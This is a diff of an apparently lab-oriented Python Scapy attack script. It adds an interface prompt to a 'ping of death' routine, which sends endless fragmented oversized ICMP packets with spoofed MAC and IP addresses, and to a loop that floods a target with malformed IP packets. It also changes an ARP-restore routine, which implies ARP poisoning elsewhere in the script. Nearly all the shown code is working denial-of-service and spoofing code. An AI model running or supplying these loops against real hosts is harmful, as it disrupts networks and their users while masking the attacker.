@@ -69,11 +69,12 @@ def is_ip(ip):
 
 def ping_of_death():
     vip = input("Enter target IP? " ) # app_gui.getEntry("pd_vic_ip")
+    iface = input("Enter interface? (e.g. eth0 / h1-eth0) ")
     try:
         if is_ip(vip):
             while True:
-                for p in fragment(Ether(src=rnd_mac(),dst=get_mac(vip,"eth0"))/IP(dst=vip, src=rnd_ip()) / ICMP() / ("Hello" * 66000)):
-                    sendp(p)
+                for p in fragment(Ether(src=rnd_mac(),dst=get_mac(vip,iface))/IP(dst=vip, src=rnd_ip()) / ICMP() / ("Hello" * 66000)):
+                    sendp(p, iface=iface)
                     time.sleep(0.01)
                 print("One wave sent...")
         else:
@@ -87,11 +88,12 @@ def ping_of_death():
 
 def malformed_pck():
     t = input("Enter target IP? ")
+    iface = input("Enter interface? (e.g. eth0 / h1-eth0) ")
     try:
         if is_ip(t):
-            dist_mac = get_mac(t,"eth0")
+            dist_mac = get_mac(t,iface)
             while (True):
-                sendp(Ether(src=rnd_mac(), dst= dist_mac) / IP(dst=t, src=rnd_ip(), ihl=2, tos=244, version=3)/ICMP() ) #
+                sendp(Ether(src=rnd_mac(), dst= dist_mac) / IP(dst=t, src=rnd_ip(), ihl=2, tos=244, version=3)/ICMP(), iface=iface ) #
                 print(rnd_mac(),">>",  dist_mac)
                 #send(packet)
                 time.sleep(0.01)
@@ -130,8 +132,9 @@ def reARP():
     try:
         #app_gui.setLabel("L1", "Restoring target")
         print("Restoring target...")
-        victim_mac = get_mac(victim_ip,"eth0")
-        gateway_mac = get_mac(victim_ip,"eth0")
+        iface = input("Enter interface? (e.g. eth0 / h1-eth0) ")
+        victim_mac = get_mac(victim_ip,iface)
+        gateway_mac = get_mac(gateway_ip,iface)
         send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff",
                  hwsrc= victim_mac), count=7)
         send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
